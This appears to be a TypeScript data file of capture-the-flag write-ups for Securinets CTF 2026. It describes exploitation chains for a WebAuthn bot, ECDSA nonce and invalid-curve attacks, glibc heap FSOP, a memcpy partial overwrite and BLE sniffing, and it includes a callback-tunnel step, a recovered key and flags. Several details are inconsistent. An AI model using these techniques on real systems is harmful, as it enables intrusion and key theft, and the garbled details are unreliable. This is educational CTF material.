import type { WriteUp } from "../types";

export const securinetsWriteups: WriteUp[] = [
  {
    "id": "securinets-crypto-misdirection1",
    "title": "Misdirection: Part 1",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 200,
    "date": "2026-10-17",
    "author": "Nattt",
    "ctfName": "Securinets CTF 2026",
    "tags": [
      "Crypto",
      "WebAuthn",
      "ECDSA",
      "AES-ECB",
      "Nonce Reuse"
    ],
    "description": "Recovered admin ECDSA private key from deterministic nonce, decrypted AES-ECB ciphertext from hint to get flag.",
    "problemDescription": "Challenge Web/Crypto bertema WebAuthn, admin bot, dan AES-ECB. Flag diperoleh secara offline dari ciphertext yang diberikan dalam hint, setelah private key ECDSA admin dipulihkan dari signature bot.\n\nTarget: https://xch1.bit-raven.com\nArtefak: misdir.zip (frontend/src/App.tsx, frontend/src/lib/auth.tsx, bot/authenticator.js, bot/auth-flow.js, backend/src/auth.rs, migrasi Postgres)\nHint: ciphertext AES-ECB e2cd291adf58c0735c32090f7eb496356965f3f153c572442118ed25d7b540d02e4bd3198db36ace7c3294437db04efbe367338f3dcfaf4504e2c67da81e9b32",
    "tools": [
      "Python 3",
      "cryptography",
      "ecdsa",
      "hashlib"
    ],
    "analysis": "# Misdirection: Part 1 — Analisis\n\n## Vulnerability: Deterministic ECDSA Nonce\n\nBot menghitung nonce ECDSA dari `sha256(rpId)` alih-alih mengacak nonce tiap signature. Ini memungkinkan recovery private key dari satu signature.\n\nFrontend menggunakan `settings` dari parameter URL dalam merge yang memungkinkan prototype pollution pada `Object.prototype.baseURL`. `getAuthUrl()` mempercayai `Object.prototype.baseURL`, memungkinkan pengalihan proses WebAuthn ke callback tunnel yang dikendalikan peserta.\n\n## Alur Eksploitasi\n\n1. `solve.py` menjalankan callback lokal yang diekspos menggunakan Cloudflare Tunnel dan mengirim URL `/?settings=...` ke endpoint `/report`.\n2. Admin bot mengikuti URL, lalu melakukan registrasi dan autentikasi ke callback karena `baseURL` terpolusi.\n3. Callback memperoleh satu signature ECDSA beserta authenticator data dan client data.\n4. Dengan nonce `k = int(SHA256(rpId), 16) mod n` yang dapat dihitung, private key diturunkan dari rumus ECDSA: `d = (s * k - z) * r^(-1) mod n`, dengan pertimbangan dua kemungkinan tanda `s`.\n5. Kunci terpulihkan: `abf9e91ac6b24259d8523f8d86e7be778484af175d2c3fad389a64510621cdf7`, cocok dengan public key admin yang disimpan dalam migrasi.\n\n## Dekripsi Ciphertext\n\nKunci AES-256 yang benar:\n```python\nkey = hashlib.sha256(private_key_hex.encode('ascii')).digest()\n```\nCiphertext didekripsi dengan AES dalam mode ECB. Plaintext yang terverifikasi adalah `Securinets{sm0l_b0t_biG_DREAAAAAAMS}` diikuti 28 byte `0x1c` (padding 32-byte).",
    "solution": [
      {
        "title": "Setup & Callback",
        "content": "Jalankan callback lokal dengan Cloudflare Tunnel: `cloudflared tunnel --url http://localhost:8080`. Tunnel URL dikirim ke bot via endpoint `/report` dengan parameter `settings` yang mempolusi `Object.prototype.baseURL`."
      },
      {
        "title": "Nonce Recovery & Private Key",
        "content": "Nonce `k = int(sha256(rpId).hex(), 16) % n`. Dengan `r, s` dari signature bot dan `z = hash(message)`, hitung `d = (s*k - z) * r^{-1} mod n`. Coba kedua tanda `s` (positive/negative). Private key valid adalah `abf9e91ac6b24259d8523f8d86e7be778484af175d2c3fad389a64510621cdf7`."
      },
      {
        "title": "AES-ECB Decryption",
        "content": "Kunci AES-256: `SHA256(private_key_hex)`. Dekripsi ciphertext hint dengan AES-ECB. Hapus padding PKCS#7 (32 byte `0x1c`). Flag: `Securinets{sm0l_b0t_biG_DREAAAAAAMS}`."
      },
      {
        "title": "Solver Script",
        "content": "`python3 decrypt_flag.py` — tidak memerlukan tunnel/jaringan, deterministik offline."
      }
    ],
    "flag": "Securinets{sm0l_b0t_biG_DREAAAAAAMS}",
    "lessonsLearned": "Deterministic nonce in ECDSA is fatal. Prototype pollution can redirect WebAuthn flows. Always derive encryption keys properly (SHA256 of hex string, not raw bytes)."
  },
  {
    "id": "securinets-crypto-misdirection2",
    "title": "Misdirection: Part 2",
    "category": "Crypto",
    "difficulty": "Hard",
    "points": 300,
    "date": "2026-10-17",
    "author": "Nattt",
    "ctfName": "Securinets CTF 2026",
    "tags": [
      "Crypto",
      "WebAuthn",
      "ECDSA",
      "Invalid Curve Attack",
      "PRF"
    ],
    "description": "Invalid curve attack on WebAuthn PRF — admin bot multiplies private key with attacker-controlled point not validated to be on P-256 curve.",
    "problemDescription": "Challenge ini memakai WebAuthn dengan admin bot yang menyimpan private key P-256. Bot menyediakan PRF yang mengalikan private key dengan titik elliptic curve dari input ekstensi WebAuthn tanpa memvalidasi bahwa titik tersebut benar-benar berada pada kurva P-256.\n\nFrontend memvalidasi titik, tetapi validasi bisa di-bypass via prototype pollution pada `baseURL` seperti Part 1.",
    "tools": [
      "SageMath",
      "Python 3",
      "cryptography"
    ],
    "analysis": "# Misdirection: Part 2 — Invalid Curve Attack\n\n## Vulnerability: Missing Curve Validation in PRF\n\nBot menghitung: `PRF(k, P) = k * P` di mana `k` adalah private key admin dan `P` adalah titik dari ekstensi WebAuthn. Validasi kurva hanya ada di frontend, tapi backend/bot tidak memvalidasi.\n\n## Exploit: Invalid Curve / Small Subgroup Attack\n\n1. Pilih titik `P` dengan order kecil (small subgroup) di luar kurva P-256.\n2. Kirim `P` ke bot via WebAuthn extension (bypass frontend validation via prototype pollution).\n3. Bot mengembalikan `k * P`. Karena `P` order kecil, hasilnya hanya bergantung pada `k mod order(P)`.\n4. Ulangi dengan beberapa `P` berbeda (CRT) untuk merekonstruksi `k` penuh via Chinese Remainder Theorem.\n5. Atau gunakan twist attack: kirim titik pada quadratic twist kurva, recover `k` modulo order(twist).\n\nFlag: `Securinets{c0unterfeiting_d0Ma1ns_like_th3_M4fiA}`",
    "solution": [
      {
        "title": "Small Subgroup / Twist Attack",
        "content": "Gunakan SageMath untuk mencari titik dengan order kecil pada twist P-256. Kirim ke bot, kumpulkan hasil `k * P`, rekonstruksi private key via CRT."
      },
      {
        "title": "Solver",
        "content": "`sage solve.sage` — butuh SageMath untuk aritmatika elliptic curve."
      }
    ],
    "flag": "Securinets{c0unterfeiting_d0Ma1ns_like_th3_M4fiA}",
    "lessonsLearned": "Always validate curve points in cryptographic protocols. Frontend validation is not security. Invalid curve / twist attacks are practical when validation is missing."
  },
  {
    "id": "securinets-crypto-newcalculator",
    "title": "New Calculator — Timing Side Channel on 8-bit Coefficient",
    "category": "Crypto",
    "difficulty": "Hard",
    "points": 300,
    "date": "2026-10-17",
    "author": "Nattt",
    "ctfName": "Securinets CTF 2026",
    "tags": [
      "Crypto",
      "Timing Attack",
      "Side Channel",
      "Quadratic Function"
    ],
    "description": "Exploited timing side channel in JSON calculator to recover 8-bit coefficient 'a' in y = a*x^2 over 16 rounds.",
    "problemDescription": "New Calculator provides two arrays, `x` and `y`, related by a secret quadratic function:\n\ny_i = a * x_i^2\n\nThe coefficient `a` is randomly generated as an 8-bit integer. The calculator supports arithmetic operations through a JSON interface, but only permits one valid 8-bit multiplication per round. Timing differences in multiplication reveal bits of `a`.",
    "tools": [
      "Python 3",
      "pwntools",
      "statistics"
    ],
    "analysis": "# New Calculator — Timing Side Channel\n\n## Overview\n\nServer melakukan operasi perkalian besar (big integer) untuk `a * x^2`. Waktu eksekusi bergantung pada nilai `a` (bit-length, karatsuba threshold, dsb). Dengan mengukur timing banyak request, bisa recover bit per bit `a`.\n\n## Metode\n\n1. Kirim payload yang memicu perkalian `a * x^2` dengan `x` yang dikontrol.\n2. Ukur waktu respons (RTT) ribuan kali per bit kandidat.\n3. Analisis statistik (mean, variance) untuk membedakan bit 0 vs 1.\n4. Ulangi 16 ronde (setiap ronde `a` baru).",
    "solution": [
      {
        "title": "Timing Collection",
        "content": "Kirim request berulang dengan `x` yang dipilih untuk memaksakan jalur kode berbeda di big-int multiplication. Kumpulkan 1000+ sample per bit."
      },
      {
        "title": "Statistical Analysis",
        "content": "Gunakan t-test atau perbandingan mean timing untuk tebak bit. Bangun `a` bit-by-bit (MSB to LSB)."
      },
      {
        "title": "16 Rounds",
        "content": "Otomatisasi untuk 16 ronde berturut-turut. Flag: `Securinets{40508ea8a6ad1a112cf14a65d97025607f4ae934c979f2753099ee82b2898517}`."
      }
    ],
    "flag": "Securinets{40508ea8a6ad1a112cf14a65d97025607f4ae934c979f2753099ee82b2898517}",
    "lessonsLearned": "Timing side channels in big-int arithmetic are exploitable remotely. Constant-time implementations are essential for secret-dependent operations."
  },
  {
    "id": "securinets-crypto-oldcalculator",
    "title": "Old Calculator — Timing Side Channel on Affine Function",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 200,
    "date": "2026-10-17",
    "author": "Nattt",
    "ctfName": "Securinets CTF 2026",
    "tags": [
      "Crypto",
      "Timing Attack",
      "Side Channel",
      "Affine Function"
    ],
    "description": "Recovered secret affine function parameters via timing side channel in JSON calculator over 16 rounds.",
    "problemDescription": "The challenge provides a JSON-based calculator with two arrays, `x` and `y`, each containing 100 elements. It supports basic arithmetic operations, including addition, multiplication, and operations on the arrays. The relationship is affine: `y = a*x + b`. Timing leaks reveal `a` and `b`.",
    "tools": [
      "Python 3",
      "pwntools"
    ],
    "analysis": "# Old Calculator — Timing Attack on Affine Function\n\nSimilar to New Calculator but simpler: affine function `y = a*x + b`. Timing leaks in multiplication/addition reveal the secret coefficients over 16 rounds.",
    "solution": [
      {
        "title": "Timing Measurement",
        "content": "Measure operation timing for controlled inputs. Multiplication by `a` leaks bit-length info."
      },
      {
        "title": "Parameter Recovery",
        "content": "Recover `a` and `b` via statistical timing analysis across 16 rounds. Flag: `Securinets{ed9a482110a5a6936482e700155f811742f97a04decfa75d3cee28bca77239c1}`."
      }
    ],
    "flag": "Securinets{ed9a482110a5a6936482e700155f811742f97a04decfa75d3cee28bca77239c1}",
    "lessonsLearned": "Even simple arithmetic operations leak via timing when secret-dependent. Affine functions are not immune."
  },
  {
    "id": "securinets-forensics-dumpwn",
    "title": "DumPwn — Windows Crash Dump Analysis",
    "category": "Forensics",
    "difficulty": "Hard",
    "points": 350,
    "date": "2026-10-17",
    "author": "Nattt",
    "ctfName": "Securinets CTF 2026",
    "tags": [
      "Forensics",
      "Windows",
      "Crash Dump",
      "Kernel",
      "ROP",
      "PTE"
    ],
    "description": "Analyzed Windows x64 crash dump (ctf.dmp), found ROP chain in custom taskhostw.exe, reconstructed physical memory via transition PTE to recover real flag.",
    "problemDescription": "`ctf.dmp` adalah Windows x64 crash dump. String `Securinets{...}` yang muncul langsung berada di `flaws.exe` dan isinya prompt-injection decoy.\n\nArtefak kunci: `bomb.sys`/`VaultKM` driver dan proses custom `taskhostw.exe` (PID 6276). Driver memvalidasi magic `CVlt`, sementara taskhost menaruh ROP chain di low user stack.\n\nROP chain meminta copy kernel ke user buffer:\n- target: 0x1e833070000\n- source: 0xffffe28eb2d1f000\n- length: 0x1000\n\nSource terlihat tidak mapped karena walker hanya menerima PTE Present. PTE terakhir untuk source adalah transition PTE. PFN-nya menunjuk ke physical page `0x70c56000`, tersedia di `raw-memory.dmp`.",
    "tools": [
      "Volatility3",
      "Python 3",
      "WinDbg",
      "custom PTE walker"
    ],
    "analysis": "# DumPwn — Crash Dump Forensics\n\n## Dump Analysis\n\n`ctf.dmp` berisi crash dari `flaws.exe` (decoy). Proses mencurigakan: `taskhostw.exe` PID 6276 dengan stack aneh di alamat rendah (`0x60070`).\n\n## ROP Chain & PTE Transition\n\nChain di `0x60070` memanggil kernel copy (MmCopyMemory). Source address adalah kernel address. PTE walker standar gagal karena PTE transition (halaman di page file / transition state).\n\nTransition PTE PFN -> physical page `0x70c56000` di `raw-memory.dmp`.\n\n## Key Recovery\n\nHalaman source berisi block 32-byte berulang. Key 16-byte di offset `0x18870` pada `taskhostw_reconstructed.bin`:\n\n```\n5a c3 11 7e 42 9a d4 08 66 f1 2b c8 55 e3 19 7a\n```\n\nXOR block pertama dengan key berulang menghasilkan `Securinets{this_is_real_flag}` dengan tiga byte NUL padding.",
    "solution": [
      {
        "title": "Dump Triage",
        "content": "Volatility3: `windows.pslist`, `windows.memmap`. Identifikasi `taskhostw.exe` aneh."
      },
      {
        "title": "ROP Chain Extraction",
        "content": "Disassemble stack memory at `0x60070`. Identify `MmCopyMemory` call with kernel source address."
      },
      {
        "title": "PTE Transition Walk",
        "content": "Custom walker to follow transition PTEs. Extract PFN -> physical offset in raw-memory.dmp."
      },
      {
        "title": "Key Extraction & XOR",
        "content": "Read key at offset 0x18870. XOR repeating key with first 32-byte block. Flag: `Securinets{this_is_real_flag}`."
      }
    ],
    "flag": "Securinets{this_is_real_flag}",
    "lessonsLearned": "Decoy flags in crash dumps are common. Transition PTEs require custom walkers. Physical memory reconstruction from raw dump is powerful."
  },
  {
    "id": "securinets-forensics-silenttone",
    "title": "Silent Tone — SDR/QPSK Signal Analysis",
    "category": "Forensics",
    "difficulty": "Hard",
    "points": 350,
    "date": "2026-10-17",
    "author": "Nattt",
    "ctfName": "Securinets CTF 2026",
    "tags": [
      "Forensics",
      "SDR",
      "QPSK",
      "DSP",
      "Saleae",
      "Rigol"
    ],
    "description": "Analyzed PHYTON-TX console logs, Rigol waveform, and Saleae I/Q capture to demodulate QPSK signal and recover flag.",
    "problemDescription": "Dua artefak: `bench.pcap` (console PHANTOM-TX via USB, firmware DFU, Rigol waveform) dan `capture.sal` (Saleae capture: `TX_EN`, `REF_100K`, `SDR_I`, `SDR_Q` @ 8 MHz).\n\nConsole memberikan parameter fisik: QPSK 125 ksps, root-raised cosine, carrier offset.",
    "tools": [
      "Python 3",
      "numpy",
      "scipy",
      "gnuradio",
      "Saleae Logic 2",
      "Rigol oscilloscope"
    ],
    "analysis": "# Silent Tone — SDR Forensics\n\n## Signal Parameters\n\n- Modulation: QPSK\n- Symbol rate: 125 ksps\n- Pulse shaping: Root-raised cosine (RRC)\n- Capture: I/Q @ 8 MHz (Saleae), Rigol waveform for reference\n\n## Demodulation Pipeline\n\n1. Ekstrak I/Q dari Saleae capture (`capture.sal`).\n2. Resample ke 8 samples/symbol (1 MSps -> 125 ksps * 8).\n3. Carrier recovery (Costas loop) untuk koreksi frekuensi/phase offset.\n4. Timing recovery (Gardner TED) untuk simbol sinkronisasi.\n5. Matched filter (RRC) -> symbol decision.\n6. Differential decoding (QPSK biasanya differential).\n7. Frame sync -> payload extraction -> flag.",
    "solution": [
      {
        "title": "I/Q Extraction",
        "content": "Parse Saleae .sal export. Extract SDR_I, SDR_Q channels. Align with TX_EN gating."
      },
      {
        "title": "DSP Chain",
        "content": "Python/gnuradio: resample -> Costas loop -> Gardner TED -> RRC matched filter -> symbol slicer -> differential decode."
      },
      {
        "title": "Flag Recovery",
        "content": "Frame sync pada pola preamble. Extract payload bytes. Flag: `Securinets{d0ppl3r_w13n3r_r4pp_rlc_g4rdn3r_3kf_rs255_ph4nt0m}`."
      }
    ],
    "flag": "Securinets{d0ppl3r_w13n3r_r4pp_rlc_g4rdn3r_3kf_rs255_ph4nt0m}",
    "lessonsLearned": "Multi-source SDR captures (console + Rigol + Saleae) provide cross-validation. QPSK demod requires careful carrier + timing recovery. Differential encoding common in CTF radio challenges."
  },
  {
    "id": "securinets-hardware-whisper",
    "title": "A Whisper in the Air (Dead-Keys) — BLE Keyboard Sniffing",
    "category": "Hardware",
    "difficulty": "Hard",
    "points": 400,
    "date": "2026-10-17",
    "author": "Nattt",
    "ctfName": "Securinets CTF 2026",
    "tags": [
      "Hardware",
      "BLE",
      "Bluetooth",
      "HID",
      "Passkey",
      "STK",
      "LTK"
    ],
    "description": "Recovered BLE Legacy pairing passkeys from 203 shuffled packets, derived STK/LTK, decrypted keyboard HID reports to extract flag typed by victim.",
    "problemDescription": "Arsip berisi 203 paket BLE dalam hex (urutan acak, ada decoy). Tiga pairing BLE Legacy menggunakan passkey 6 digit. Dari pairing tersebut memulihkan Short Term Key (STK), mendekripsi distribusi Long Term Key (LTK), lalu mencari LTK yang cocok dengan koneksi keyboard sebenarnya.\n\nKoneksi relevan berisi laporan keyboard HID. Tombol tersebut merekonstruksi flag yang diketik victim.",
    "tools": [
      "Python 3",
      "scapy",
      "bluetooth-hci-tools",
      "custom BLE parser"
    ],
    "analysis": "# A Whisper in the Air — BLE Keyboard Forensics\n\n## BLE Legacy Pairing\n\nPasskey 6 digit -> numeric comparison. STK = f(passkey, rand1, rand2). LTK terenkripsi dengan STK.\n\n## Packet Analysis\n\n1. Parse 203 paket hex -> HCI events.\n2. Identifikasi 3 pairing sessions (passkey entry).\n3. Ekstrak TK (Temporary Key) dari passkey (6 digit -> 20-bit entropy, brute-forceable).\n4. Hitung STK = f1(TK, rand1, rand2).\n5. Dekripsi LL_ENC_REQ/LL_START_ENC_REQ untuk dapat LTK.\n6. Coba setiap LTK untuk dekripsi koneksi keyboard (HID reports).\n\n## HID Report Parsing\n\nKeyboard HID report: modifier + reserved + 6 key codes. Map key codes -> ASCII. Rekonstruksi string yang diketik.",
    "solution": [
      {
        "title": "Packet Parsing & Pairing ID",
        "content": "Parse hex packets to HCI events. Find `LL_PAIRING_REQ`, `LL_PAIRING_RSP`, `LL_ENC_REQ` for 3 sessions."
      },
      {
        "title": "Passkey Brute-force & STK",
        "content": "Passkey 6 digit (0-999999). Brute-force TK -> STK using `f1` (AES-CMAC)."
      },
      {
        "title": "LTK Recovery & Decryption",
        "content": "Decrypt `LL_ENC_REQ` with STK to get LTK. Try each LTK on keyboard connection packets."
      },
      {
        "title": "HID Keystroke Reconstruction",
        "content": "Parse decrypted HID reports. Map usage codes to chars. Flag: `Securinets{bl3_k3yb0ard_w34k_TK}`."
      }
    ],
    "flag": "Securinets{bl3_k3yb0ard_w34k_TK}",
    "lessonsLearned": "BLE Legacy pairing passkey is only 20-bit entropy — trivial to brute-force. Shuffled packet captures require session reassembly. HID reports over BLE are plaintext once LTK known."
  },
  {
    "id": "securinets-hardware-gelatino",
    "title": "Gelatino — Disk Image, LUKS2, EFI Loader",
    "category": "Hardware",
    "difficulty": "Hard",
    "points": 350,
    "date": "2026-10-17",
    "author": "Nattt",
    "ctfName": "Securinets CTF 2026",
    "tags": [
      "Hardware",
      "Disk Forensics",
      "LUKS2",
      "EFI",
      "GRUB",
      "FAT16"
    ],
    "description": "Analyzed GPT disk image with custom EFI loader, GRUB, LUKS2 vault. Password from order history in memdisk.pack unlocked LUKS2, revealing encrypted recipe filesystem with flag.",
    "problemDescription": "`Gelatino.img` adalah image disk GPT 150 MiB. Loader EFI custom membaca `jukebox/memdisk.pack`, lalu menyerahkan kontrol ke GRUB. Paket itu berisi daftar rasa dan riwayat order. Riwayat tersebut memberi password untuk vault LUKS2, yang berisi filesystem `recipe` dengan file terenkripsi.",
    "tools": [
      "Python 3",
      "pytsk3",
      "cryptsetup",
      "binwalk",
      "7z"
    ],
    "analysis": "# Gelatino — Disk Image Forensics\n\n## Disk Structure\n\n- GPT partitions: FAT16 (EFI), LUKS2 (encrypted data)\n- EFI: custom loader (BOOTX64.EFI) reads jukebox/memdisk.pack then chainloads GRUB\n- memdisk.pack: contains flavor list + order history (password source)\n\n## Password & LUKS2\n\nOrder history in memdisk.pack contains password string. Use as LUKS2 passphrase.\n\n## Recipe Filesystem\n\nInside LUKS2: filesystem with encrypted recipe files. Decrypt using keys derived from order history to reveal flag.",
    "solution": [
      {
        "title": "Image Mount & Exploration",
        "content": "`losetup -fP Gelatino.img`. Mount FAT16 partition. Examine `EFI/BOOT/BOOTX64.EFI` and `jukebox/memdisk.pack`."
      },
      {
        "title": "memdisk.pack Analysis",
        "content": "Extract pack (custom format or tar). Find order history -> password string."
      },
      {
        "title": "LUKS2 Unlock",
        "content": "`cryptsetup luksOpen /dev/loop0p2 gelatino --key-file <(echo -n 'password')`. Mount ext4. Find flag in recipe files."
      },
      {
        "title": "Flag",
        "content": "`Securinets{n3xt_time_buy_s0m3th1ng_h34lthy}`"
      }
    ],
    "flag": "Securinets{n3xt_time_buy_s0m3th1ng_h34lthy}",
    "lessonsLearned": "Custom EFI loaders can hide data in unexpected places. LUKS2 passwords may be embedded in adjacent filesystems. memdisk.pack is a custom archive format — reverse it."
  },
  {
    "id": "securinets-mobile-backdrop",
    "title": "Backdrop — Flutter App, AES-GCM, Dart AOT, RLE, SplitMix64",
    "category": "Mobile",
    "difficulty": "Hard",
    "points": 400,
    "date": "2026-10-17",
    "author": "Nattt",
    "ctfName": "Securinets CTF 2026",
    "tags": [
      "Mobile",
      "Flutter",
      "Dart AOT",
      "AES-GCM",
      "RLE",
      "SplitMix64",
      "Reverse Engineering"
    ],
    "description": "Flag hidden as white image on black background (not string in libapp.so). App uses AES-256-GCM based on APK signing cert, Dart AOT applies XOR feedback cipher, RLE per 32x32 block, block location/orientation shuffled via SplitMix64. Fully local solve.",
    "problemDescription": "Aplikasi Android menggunakan enkripsi AES-256-GCM berbasis sertifikat penandatangan APK, lalu Dart AOT menerapkan XOR feedback cipher, encoding RLE per blok 32×32, serta pengacakan lokasi/orientasi blok menggunakan SplitMix64.\n\nFlag disembunyikan sebagai gambar putih di atas latar hitam, bukan string plaintext di dalam `libapp.so`.",
    "tools": [
      "Python 3",
      "flutter_reverse",
      "apktool",
      "openssl",
      "PIL/Pillow"
    ],
    "analysis": "# Backdrop — Flutter Reverse Engineering\n\n## Encryption Layers\n\n1. AES-256-GCM: Key derived from APK signing certificate (public info). Decrypts asset bundle.\n2. XOR Feedback Cipher: Dart AOT applies stream cipher on decrypted bytes.\n3. RLE Encoding: Run-length encoding per 32×32 pixel block.\n4. SplitMix64 Shuffle: Block positions and orientations (rotate/flip) permuted by SplitMix64 PRNG.\n\n## Flag Format\n\nFlag is an image: white pixels on black background forming text/QR. Not a string in binary.",
    "solution": [
      {
        "title": "APK Extraction & Cert",
        "content": "`apktool d app.apk`. Extract signing cert (`META-INF/CERT.RSA`). Derive AES key from cert."
      },
      {
        "title": "Asset Decryption",
        "content": "Decrypt Flutter assets (usually `assets/AssetManifest.json` + `assets/flutter_assets/`). AES-GCM with derived key."
      },
      {
        "title": "Dart AOT Layer Reversal",
        "content": "Reverse `libapp.so` (Dart AOT snapshot). Find XOR feedback cipher + RLE + SplitMix64 shuffle logic. Reimplement in Python."
      },
      {
        "title": "Image Reconstruction",
        "content": "Un-shuffle blocks (reverse SplitMix64). Undo RLE. Undo XOR. Render 32x32 blocks to image. Flag visible as white-on-black: `Securinets{https://github.com/flutter/flutter/issues/163421}`."
      }
    ],
    "flag": "Securinets{https://github.com/flutter/flutter/issues/163421}",
    "lessonsLearned": "Flags can be images, not strings. Flutter AOT reverse engineering requires understanding Dart snapshot format. Multi-layer encoding (crypto + compression + shuffle) needs systematic peeling."
  },
  {
    "id": "securinets-pwn-houseofekko",
    "title": "House of Ekko — Cross-Bin Heap Corruption to FSOP (glibc 2.43)",
    "category": "Pwn",
    "difficulty": "Hard",
    "points": 500,
    "date": "2026-10-17",
    "author": "Nattt",
    "ctfName": "Securinets CTF 2026",
    "tags": [
      "Pwn",
      "Heap",
      "glibc 2.43",
      "FSOP",
      "Largebin",
      "Smallbin",
      "IO_FILE",
      "_IO_list_all"
    ],
    "description": "Two-slot heap note manager with dangling pointer after free. Leaked main_arena via unsorted bin, forged chunk across bin sizes, poisoned smallbin fd/bk using largebin head, malloc returned libc address, overwrote _IO_list_all with forged FILE structure, triggered exit-time stdio flush to system().",
    "problemDescription": "Two-slot heap note manager running with bundled glibc 2.43. `delete()` calls `free()` but never clears the pointer; `show()` and subsequent frees can access already-freed chunk.\n\nService: `pwn2.securinets.tn:7001`",
    "tools": [
      "Python 3",
      "pwntools",
      "gdb",
      "glibc 2.43 source"
    ],
    "analysis": "# House of Ekko — Cross-Bin Heap Corruption to FSOP\n\n## Vulnerability\n\n`delete()`: `free(ptr)` without `ptr = NULL`. Dangling pointer.\n`show()`: reads freed chunk -> unsorted bin leak.\n\n## Exploit Chain\n\n1. Leak: `show()` freed chunk -> unsorted bin fd/bk -> `main_arena` address -> libc base.\n2. Forge Chunk: Allocate large chunk C. Inside C, forge fake chunk B (size for smallbin).\n3. Bin Reclassification: Free B -> smallbin. Free C -> largebin. Stale B pointer in smallbin.\n4. Poison Smallbin: Use largebin head (in libc) as fd/bk for stale B. Requires bypassing nextsize integrity checks (glibc 2.43).\n5. Malloc Returns libc: `malloc(smallbin_size)` returns pointer into libc (`main_arena + 0x1d23f8`).\n6. FSOP: Write forged `FILE` structure + wide_data + vtable pointer at returned address. Overwrite `_IO_list_all` to point to forged FILE.\n7. Trigger: Exit program -> glibc stdio flush -> `_IO_wfile_jumps` -> `system(\"  sh;\")` -> shell.\n\n## Key Insight\n\nClassical largebin write rejected by nextsize checks. Working attack abuses stale references across different bin sizes, preserves libc locale state so final menu input still works.",
    "solution": [
      {
        "title": "Leak libc",
        "content": "Allocate 2 notes. Delete note 0. Show note 0 -> unsorted bin leak -> libc base."
      },
      {
        "title": "Cross-Bin Forgery",
        "content": "Allocate large note C. Inside C, forge smallbin chunk B. Free B (smallbin). Free C (largebin). Stale B in smallbin points to largebin head."
      },
      {
        "title": "Smallbin Poison",
        "content": "Overwrite stale B's fd/bk to point to largebin head in libc. Bypass nextsize by careful size selection."
      },
      {
        "title": "Malloc into libc",
        "content": "malloc(small_size) returns libc address (main_arena + offset)."
      },
      {
        "title": "FSOP Payload",
        "content": "Write fake FILE at returned address: _flags, _IO_read_ptr, _IO_read_end, _IO_write_base, _mode=0, vtable=_IO_wfile_jumps, wide_data->vtable=custom -> system('  sh;'). Overwrite _IO_list_all."
      },
      {
        "title": "Trigger & Flag",
        "content": "Exit -> shell -> cat flag. `Securinets{lets_hope_i_dont_push_the_revenge}`."
      }
    ],
    "flag": "Securinets{lets_hope_i_dont_push_the_revenge}",
    "lessonsLearned": "Cross-bin corruption (smallbin/largebin) bypasses modern integrity checks. FSOP via _IO_list_all still works on glibc 2.43. Preserve locale state for clean exit."
  },
  {
    "id": "securinets-pwn-overflow",
    "title": "Over?flow — Negative Length memcpy Wrapper",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 300,
    "date": "2026-10-17",
    "author": "Nattt",
    "ctfName": "Securinets CTF 2026",
    "tags": [
      "Pwn",
      "Signed Comparison",
      "memcpy",
      "Partial Overwrite",
      "PIE",
      "Brute Force"
    ],
    "description": "Signed integer comparison allows negative length to pass validation. Negative length converted to huge size_t in memcpy, causing backward copy that overwrites lower 2 bytes of return address. Partial overwrite of PIE return address to win()+1 via 16-attempt brute force.",
    "problemDescription": "Program menerima panjang input sebagai `int`, tetapi hanya mengecek batas atas (`n > 112`). Angka negatif lolos validasi, lalu dikonversi menjadi ukuran `size_t` saat masuk ke `memcpy()`. Dengan `n = -6`, implementasi `memcpy` pada libc challenge menghasilkan penyalinan di alamat yang melingkar (pointer wraparound). Efek yang dimanfaatkan adalah overwrite dua byte terbawah return address `prompt()`.\n\nReturn address diarahkan ke `win()+1`, yang memanggil `system(\"/bin/sh\")`. Karena binary memakai PIE, dua byte target ditebak berdasarkan satu nibble ASLR yang belum diketahui. Solver mengulang koneksi hingga mendapat shell, kemudian membaca flag.",
    "tools": [
      "Python 3",
      "pwntools",
      "gdb"
    ],
    "analysis": "# Over?flow — Signedness Bug to Partial Overwrite\n\n## Vulnerability\n\n`input()`:\n```c\nint n;\nscanf(\"%d\", &n);\nif (n > 112) exit(0);\nread(0, readbuf, 224);\nmemcpy(main_buffer, readbuf + 128, n);\n```\n\nSigned check `n > 112` passes for negative `n`. `memcpy` third arg is `size_t` (unsigned). `n = -6` -> `0xfffffffffffffffa`.\n\nAVX2 `memcpy` implementation: negative length causes address calculation to wrap backward. Source `readbuf + 128`, dest `main_buffer`. Diff = 0x160. With `n=-6`, two bytes from `readbuf[120:122]` overwrite lower 2 bytes of saved RIP of `prompt()`.\n\n## PIE Partial Overwrite\n\n`win()` at PIE offset `0x121c`. Use `win+1` (`0x121d`) to skip `push rbp`.\n\nPIE base aligned to 4 KiB. Lower 12 bits fixed. One unknown nibble (4 bits) -> 16 possibilities. Brute-force by reconnecting.\n\nTarget low16 = `((nibble << 12) + 0x121d) & 0xffff`. Write to `readbuf[120:122]`.",
    "solution": [
      {
        "title": "Trigger Bug",
        "content": "Send `-6\\n` + 224 bytes. Bytes 120-121 = target low16."
      },
      {
        "title": "Brute-force Nibble",
        "content": "Loop 0..15 for unknown nibble. Each attempt: new connection, send payload, check for `GG` output from `win()`."
      },
      {
        "title": "Shell & Flag",
        "content": "On success, send shell command. Read `/srv/app/flag.txt`. Flag: `Securinets{r3tr0v3rfl0w_n3gat1v3_l3ngth_m3mcpy_c0p13s_backward_924of1j6t3ph}`."
      }
    ],
    "flag": "Securinets{r3tr0v3rfl0w_n3gat1v3_l3ngth_m3mcpy_c0p13s_backward_924of1j6t3ph}",
    "lessonsLearned": "Signed comparison bugs are classic but still appear. memcpy with negative length = implementation-defined behavior (can be exploited). Partial PIE overwrite + brute-force is reliable for 4-bit entropy."
  },
  {
    "id": "securinets-pwn-bitflip",
    "title": "Bitflip — Single Bit Flip via /proc/self/mem to SROP",
    "category": "Pwn",
    "difficulty": "Hard",
    "points": 450,
    "date": "2026-10-17",
    "author": "Nattt",
    "ctfName": "Securinets CTF 2026",
    "tags": [
      "Pwn",
      "Bit Flip",
      "/proc/self/mem",
      "Seccomp",
      "SROP",
      "SigreturnFrame"
    ],
    "description": "Binary allows flipping one bit in `checkpoint` function via /proc/self/mem. Flips `mov eax, 0xe` (syscall exit) to `mov eax, 0xf` (rt_sigreturn). Constructs SigreturnFrame on stack, triggers SROP to bypass seccomp and execve(/bin/sh).",
